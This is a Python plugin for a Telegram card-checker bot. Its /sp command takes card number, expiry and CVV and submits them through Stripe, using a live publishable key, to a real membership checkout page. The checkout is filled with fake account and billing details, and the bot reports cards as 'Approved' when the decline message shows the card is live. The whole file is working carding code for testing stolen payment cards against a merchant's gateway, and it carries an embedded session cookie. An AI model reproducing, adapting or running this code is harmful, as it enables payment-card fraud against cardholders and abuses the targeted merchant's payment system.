import requests
import json
import random
import string
import time
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
#keys


# need variables
ok=["!",".","/",]

bbin = ['529750', '515462', '401658', '543816', '519479', '489504', '415285', '539150', '483698', '522974', '404942']

OWNER=[1808767615, 1007962272, 1237452850]

PREMIUM = [1868627711, 2104057670]

FREE = []
msg_count = 0
id_in_spam = []
# time variables
clock = 0
t=0

def random_char(y):
       return ''.join(random.choice(string.ascii_lowercase) for x in range(y))

mail = (random_char(10)+"@gmail.com")

def name(x):
       return ''.join(random.choice(string.ascii_lowercase) for x in range(x))
       
name = (random_char(7))

def password(y):
       return ''.join(random.choice(string.ascii_lowercase) for x in range(y))
       
password = (random_char(9))

def sp_cmd(client, message):
    global msg_count, clock, wait
    # check if user in premium
    if message.from_user.id in PREMIUM or message.from_user.id in FREE or  message.from_user.id in OWNER:
        # check if correct format
        if "|" not in message.text:
            message.reply_text("**Stripe Auth\nFormat: `cc|m|y|cvv`**")
        if "|" in message.text:
            userid = message.from_user.id
            if userid not in OWNER:
                id_in_spam.insert(0, userid)
            else:pass
            fname = message.from_user.first_name
            cc = message.text[len('/sp '):33]
            splitter = cc.split('|')
            ccn = splitter[0]
            month = splitter[1]
            year = splitter[2]
            cvc = splitter[3]
            ab  = ccn[0:6]
            
            wait = message.reply("**Checking CC...**", reply_to_message_id=message.message_id)
            #####################################################################
            try:
                bin = requests.get(f"https://bins-ws-api.deta.dev/api/{ccn}").json()
                vendor = bin['data']['vendor']
                type = bin['data']['type']
                level = bin['data']['level']
                bank = bin['data']['bank']
                country = bin['data']['country']
                flag = bin['data']['countryInfo']['emoji']
                ####################################################################################
                url = 'https://api.stripe.com/v1/payment_methods'
                
                headers = {
                  'authority': 'api.stripe.com',
                  'method': 'POST',
                  'path': '/v1/payment_methods',
                  'scheme': 'https',
                  'accept': 'application/json',
                  'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                  'content-type': 'application/x-www-form-urlencoded',
                  'origin': 'https://js.stripe.com',
                  'referer': 'https://js.stripe.com/',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'
                }
                postdata = {
                  'type': 'card',
                  'billing_details[address][line1]': 'Cheluvadipalya',
                  'billing_details[address][city]': 'New York',
                  'billing_details[address][state]': 'New York',
                  'billing_details[address][postal_code]': '10080',
                  'billing_details[address][country]': 'US',
                  'billing_details[name]': name,
                  'card[number]': ccn,
                  'card[cvc]': cvc,
                  'card[exp_month]': month,
                  'card[exp_year]': year,
                  'guid': 'N/A',
                  'muid': '9670a3e9-94a5-4423-8e76-9d0478487fe37531b9',
                  'sid': 'ed45e47f-32dd-4ff2-8802-17ae85692f1380e8a8',
                  'payment_user_agent': 'stripe.js/137b5bf7c;+stripe-js-v3/137b5bf7c',
                  'time_on_page': '178531',
                  'key': 'pk_live_51JGMZ6GvIIxji5jaPtT6kJSqx3toK752qc4xxgQOtc5OqPidZAkB2xaUIjbKto8UeyYM13rFoeumLjWvpaRP5V0v006RgdEbVt'
                  
                }
                kya = requests.post(url = url, headers = headers, data = postdata)
                ye = json.loads(kya.text)
                pm = ye['id']
                took = kya.elapsed.total_seconds()
                stook = str(took)

                url2 = 'https://www.ricsathleticassociation.com/membership-account/membership-checkout/?level=6/'

                headers2 = {
                  'authority': 'www.ricsathleticassociation.com',
                  'method': 'POST',
                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                  'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                  'content-type': 'application/x-www-form-urlencoded',
                  'cookie': 'PHPSESSID=a826a0554de58653150493d16eccbcd0;pmpro_visit=1;__stripe_mid=9670a3e9-94a5-4423-8e76-9d0478487fe37531b9;__stripe_sid=ed45e47f-32dd-4ff2-8802-17ae85692f1380e8a8',
                  'origin': 'https://www.ricsathleticassociation.com',
                  'sec-fetch-site': 'same-origin',
                  'sec-fetch-mode': 'navigate',
                  'sec-fetch-dest': 'document',
                  'referer': 'https://www.ricsathleticassociation.com/membership-account/membership-checkout/?level=6',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
                  
                }
                postdata2 = {
                  'level': '6',
                  'checkjavascript': '1',
                  'donation': '',
                  'username': name,
                  'password': password,
                  'password2': password,
                  'bemail': mail,
                  'bconfirmemail': mail,
                  'fullname': '',
                  'bfirstname': 'Mohan',
                  'blastname': 'Singh',
                  'baddress1': '20 Cheluvadipalya',
                  'baddress2': '',
                  'bcity': 'Bengaluru',
                  'bstate': 'Karnataka',
                  'bzipcode': '560053',
                  'bcountry': 'US',
                  'bphone': '0+(797)+542-1633',
                  'CardType': 'visa',
                  'submit-checkout': '1',
                  'javascriptok': '1',
                  'payment_method_id': pm,
                  'AccountNumber': ccn,
                  'ExpirationMonth': month,
                  'ExpirationYear': year
                  
                }
                hm = requests.post(url = url2, headers = headers2, data = postdata2)
                ok = json.dumps(hm.text)
                took = hm.elapsed.total_seconds()
                took = str(took)
                if "Your card's security code is incorrect." in ok or "Your card&#039;s security code is incorrect" in ok or "Your card\u0027s security code is incorrect." in ok:
                  wait.edit_text(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Approved ✅**\n--Result--: **CCN!** [__Your card's security code is incorrect.__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
                elif "Your card has insufficient funds." in ok:
                  wait.edit_text(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Approved ✅**\n--Result--: **CVV!** [__Your card has insufficient fund.__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
                elif "Your card was declined." in ok:
                  wait.edit_text(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Your card was declined__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
                else:
                  wait.edit_text(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Generic decline__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
            except Exception as e:
                wait.edit(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Card Error__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **Instantly**\n**Checked By {fname}**")
                 


# timer for antispam
def counter_out(t1):
    global clock, msg_count,t, id_in_spam
    while len(id_in_spam) != 0:
        t = t1
        while t > 0:
            def counter_inner():
                global t, clock, msg_count, id_in_spam
                time.sleep(1)
                t -= 1
                return t

            clock = counter_inner()
            if clock == 0:
                id_in_spam.pop(-1)


# main fucntion
@Client.on_message(filters.command(["sp", "sp@CardChkBot"], ok))
def main(client, message):
    global msg_count, clock, t, id_in_spam
    cc = message.text[len('/sp '):33]
    splitter = cc.split('|')
    ccn = splitter[0]
    bb = ccn[0:6]
    if bb in bbin:
      message.reply_text("**Bin Banned**")
    elif message.from_user.id not in id_in_spam:

        if message.from_user.id in OWNER:
            ########################################
            sp_cmd(client, message)  # adds user in id_in_spam
            ######################################
            # removes user from spam after time
        elif message.from_user.id in PREMIUM:
            ########################################
            sp_cmd(client, message)  # adds user in id_in_spam
            ######################################
            counter_out(20)  # removes user from spam after time
        elif message.from_user.id in FREE:
            ########################################
            sp_cmd(client, message)  # adds user in id_in_spam
            ######################################
            counter_out(57)  # removes user from spam after time
        else:
            FREE.append(message.from_user.id)
            sp_cmd(client, message)  # adds user in id_in_spam
            ######################################
            counter_out(60)

    else:
        message.reply(f"**This is an ANTISPAM Timer $_$\n__Retry again in__ `{clock}s`**")
